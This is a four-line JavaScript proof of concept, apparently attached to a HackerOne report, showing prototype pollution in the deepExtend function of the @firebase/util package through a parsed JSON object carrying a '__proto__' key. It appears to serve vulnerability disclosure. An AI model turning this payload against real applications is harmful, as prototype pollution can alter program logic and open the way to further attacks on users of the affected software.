//https://hackerone.com/reports/1001218
  const utils = require("@firebase/util");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepExtend({}, source);
